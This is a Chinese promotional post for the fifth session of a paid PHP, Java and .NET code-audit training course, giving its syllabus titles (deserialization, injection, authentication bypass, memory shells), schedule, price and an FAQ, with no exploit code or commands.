![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTgIqv52x1t6eoicFf9v1qBIMw4rI7sQJFR50jQGbGMRBV24TNg4ja1zicLdG29AqeKxrSAWvfCkC2vB0Z0I6t8Efl34PrXdmckw/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=79 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQDYNBQZb8znATzZvngicGibapL4V5rm8OFXggd3J8k1py09wRwr8Yt2VQSN6zdGQUnGktjUY3eqY3oZ4ygicXW4eCBcIdfT76TcY/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=80 "")  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQF4zIicK318t3Pf3C8g121bAS94Wom6BkJlkofOPTKGdhEYS9Nu7KwThEoSfEXicouv2rMX6M5cBw6tbwtbC3bDNmPhBcPZktHA/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=81 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQXCZrGicFzY6J8FxthOoQJFYktU9DEjs9WwYBKfmu7swhIXdebxMyOVkmjJumUFicHqawueo6Mwx84r86CNhpYxBVDfRn9CD4NU/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=82 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTibHj2nB0kTu1JOqmckfVcr7EICpK3fy8QHRh8C6ia4Bia6gnicJpZAHy9m4Q9z5hEUOwgQp0nTPJ7sjz2yXAWz9pfyQk5x332CNo/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=83 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTryN4fJmyd0MFZjfRMic3jpLM1JMryQm888HI5bmy8gZU4sGVGFk5KPk7LJUh2oRvwuIcKYplptiak2Rp2c2YzMLPwFpn45oibQg/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=84 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTBWiaLsMia8oxGuKYeScgPaJv5RyyoSFptE2wfRUoZh0zt15sZvrb4nFyFTcdYXqCkS8zl8jdvz6bpMUrbPiajrK51zADLwfYIM4/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=85 "")  
  
  
  
  
  
**左右滑动查看更多**  
  
**>**  
  
(其实报喜一个是为了宣传，更重要的其实每当学员来报喜的时候，都有一种成就感，最起码能够认定自己的课程是有一定价值一定性价比的，而且确实收了师傅们的钱，能够帮助到师傅们一些，自己也就更有坚持下去做培训的信心。  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/HBLcNkZ8PQddO5DZYzH4GcwlsOwEK5cR1A5XZuWXTP3ib3tWpcAtuLUaliasnZQvBmenGd0UNicFQOsJGyIzodicicg/640?from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=120 "")  
  
二、第五期课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/dJGuszYr5iaRGiaZURAxJAROibCh1sjaZictcbC4iasuuOgCMQSDSwrG5Wfrx2QgfvKx8icDhm0gIia8fN6mThehEK8ww/640?from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=121 "")  
  
  
  
    第五期课程仍然是以代码审计为主，本次课程还是为三个语言的代码审计0-1讲解，目的为帮助学员完成0-1+1的白盒（代码审计）漏洞挖掘，并且在出货的基础上再+1去出高质量的漏洞（  
例如组合拳RCE、前台相关漏洞等）。  
  
  
1  
  
开课时间&课程周期  
  
开课时间暂定为：2026年4月3日  
  
开课周期预计到：三个月左右（直播+录播）  
  
**课程大纲**  
  
    本次课程分为PHP、JAVA、NET代码审计为直播+录播，为了照顾一些基础较为薄弱的师傅新增基础~技巧~番外（录播课程）。  
  
  
01  
  
PHP&JAVA&NET代码审计 (直播+录播)  
  
     
  
    之前课程大纲主要为xxx实战案例，本次课程大纲着重体现思路方向，并非取消了实战部分，实战部分之多不减。  
  
PHP课程目录  
  
  
✅   
   
第一节课：多框架初识&路由认识&参数传递  
  
✅   
   
第二节课：多框架&鉴权分析&认证与鉴权&鉴权方式  
  
✅   
   
第三节课：多框架&常见漏洞函数&回显&非回显  
  
✅   
   
第四节课：注入漏洞&常见位置&实战审计注入类漏洞  
  
✅   
   
第五节课：前台RCE漏洞审计&漏洞案例技巧讲解  
  
✅   
   
第六节课：门户网站CMS&网络设备&审计经验讲解  
  
✅   
   
第七节课：多框架&鉴权对抗&权限绕过技巧&案例分析  
  
✅   
   
第八节课：组合拳RCE漏洞分析&漏洞组合拳利用&案例  
  
✅   
   
第九节课：PHP下反序列化漏洞&魔术方法&pop链分析  
  
✅   
   
第十节课：PHP下反序列化漏洞实战&phar协议RCE案例  
  
  
JAVA课程目录  
  
  
✅   
   
第一节课：Servlet&Spring Boot&Spring MVC&Struts2  
  
✅   
   
第二节课：多框架下&拦截器&认证鉴权&组件鉴权分析  
  
✅   
   
第三节课：多框架下&权限绕过&鉴权对抗&案例分析  
  
✅   
   
第四节课：常见漏洞函数&案例分析&审计技巧  
  
✅   
   
第五节课：前台漏洞审计&组合拳rce漏洞&技巧&案例  
  
✅   
   
第六节课：反序列化&CC链利用&反序列化漏洞利用  
  
✅   
   
第七节课：  
Ognl&SpEl&EL表达式注入&漏洞案例  
  
✅   
   
第八节课：内存马简介&内存马原理分析&内存马注入方式  
  
✅   
   
第九节课：RMI&JNDI注入&JNDI注入漏洞利用&案例  
  
✅   
   
第十节课：组件漏洞&shiro&fastjson&log4j分析&利用  
  
  
.NET课程目录  
  
  
✅   
   
第一节课：初识.NET&Web From & MVC架构框架分析  
  
✅   
   
第二节课：Web From&MVC框架&鉴权分析&认证方式  
  
✅   
   
第三节课：多框架下&鉴权对抗&权限绕过分析&案例  
  
✅   
   
第四节课：注入漏洞分析&文件操作类漏洞&实战分析  
  
✅   
   
第五节课：常见漏洞位置&前台漏洞审计&漏洞案例讲解  
  
✅   
   
第六节课：组合拳RCE漏洞分析&组合拳RCE案例讲解  
  
✅    
第七节课：.NET反序列化漏洞初识&反序列化漏洞原理  
  
✅    
第八节课：.NET安全反序列化链&反序列化触发场景  
  
✅    
第九节课：.NET反序列化漏洞案例&反序列化漏洞分析  
  
  
02  
  
基础~技巧~番外（录播)  
  
  
该篇章为长期更新  
  
  
1  
  
基础篇章  
  
1、  
由于之前上课时部分师傅存在一定基础，刚开始的课程部分师傅认为自己可以跟的上等问题，导致时间的浪费。  
  
  
2、  
同时有一定的师傅存在无法搭建源码，以及软件下载等问题，于是将这种基础问题，统一归纳为基础篇章，供师傅们学习，节省师傅们时间提升学习效率及课程质量  
  
  
3、同时面对部分学员频繁提出的一些问题，针对该问题同样会进行解答，并且进行录制上传至基础篇章中。  
  
  
2  
  
技巧篇章  
  
1、  
随着自己技术的进步也了解到了一些新型的技巧或者手法，例如sql注入的某一个技巧，但是重新讲解又浪费大量时间，特地新增了技巧篇章，将单独的技巧进行讲解  
。  
  
  
3  
  
番外篇章  
  
1、自己在第四期讲过一些逆向相关，并且还存在相关的一些好的案例，得到了挺多师傅的认可，例如某APP接管存储桶等案例，于是之后在有好的案例将进行上传更新。  
  
**课程思维导图**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTEkNWslJMVIn6CX8tDqMngic7dtGH5qYTWS54T6AJicTpOwvccuf7jkIYZP8NKicUjPOhGFbLvXf1oiayLsia1PtKrnkNniaic81sicls/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=122 "")  
  
  
**常见疑问&课程讲解**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=123 "")  
  
第五期课程  
收费多少？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=124 "")  
  
本次课程收费仍然是  
1688，并且还是承诺一次报名后续不再进行任何二次收费保障（包含  
内部平台，  
以及后续推出一系列内容均可观看）。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=125 "")  
  
什么时间段上课，上课周期是多长时间？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=126 "")  
  
第五期课程【直播+录播】上课周期为  
三个月，一般集中在  
周五六日这三天，一周保持  
2～3节课，每节课  
1小时左右。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=127 "")  
  
作为学员，我们都有哪些权益？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=128 "")  
  
首先最关键的就是  
课程内容是可以一直学习的，同时  
内部报告平台也可进行观看，  
答疑是不限时长，不限类型方向，任何方向均可，再次同时代码审计最关键的就是源码，  
源码&课件&视频都是给兄弟们配套的，当然无聊找小朋友聊天一起打游戏也可以哦。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=129 "")  
  
学完之后可以达到什么水平？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=130 "")  
  
学完之后可以达到可以进行  
独立审计的水平，在面对  
php、JAVA、NET主流语言的源码，可以进行  
独立审计，  
验证漏洞，对于一些  
JAVA安全内容例如：  
反序列化，内存马等也有一定的理解，可以进行打  
反序列化漏洞、  
注入内存马等操作，同时  
PHP的反序列化、pop链，phar协议等利用也有一定理解，且此类漏洞导致RCE  
均有案例。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=131 "")  
  
0基础可以学吗？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=132 "")  
  
1、这是大家最常问的一个问题，  
0基础是可以的，我的代码审计课程一直秉持着  
帮助大家完成代码审计0-1的目标，同时往期（第四期）课程新增了进阶课，其目的也是帮助大家完成  
0-1出洞到0-1出有质量的漏洞。  
  
  
2、另外考虑到有的  
学员基础较为薄弱，本期同时也开了  
番外篇&基础篇，师傅们可以观看这块分区课程内容，此类分块课程目的就是为  
协助到一些基础比较薄弱的师傅们。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=133 "")  
  
是那种读PPT拿着靶场讲解吗？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=134 "")  
  
不会，课程均使用一些  
0Day&1Day&Nday优质漏洞来进行授课，且本期案例均为从  
简-难漏洞案例，深度体验代码审计当中的  
难易区分，  
完全杜绝靶场以及去读PPT的，从培训第一期开始到现在，基本为上课开始看几眼课件，  
让学员熟悉这节课的大概内容等信息，然后  
直接实操到下课，这一点也是  
我干培训五期以来一直使用的授课方式。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=135 "")  
  
是否有简历修改&内推等福利？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=136 "")  
  
有的兄弟，有的，  
不介意小朋友的指导简历这类的话，随时欢迎大家来骚扰我。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=137 "")  
  
为什么你不新增AI方向的内容？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=138 "")  
  
目前我个人认为AI可以帮助我们  
提升很大的效率，但是前提是  
AI的使用者本身要懂这个技术，才可以利用AI来  
降低该技术门槛，提升效率，  
完全自动化目前感觉还是无法做到，包括  
课程当中也会使用AI会顺带着给师傅讲了  
如何用ai来提升效率，同时如果反馈不会使用的师傅较多，会考虑后续在基础～技巧～番外来更新该方向内容。  
  
  
**联系方式**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSZkKW9NKvsZrcwWrW30RPavKyjCsUaicrsxqrBkPpmbiaaKFXbXqaSgz6KfqficXuysRj4x5zXH5HPickXGhwia8oMyRGOdjeJ0JRQ/640?wx_fmt=png&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=23 "")  
  
  
  
  
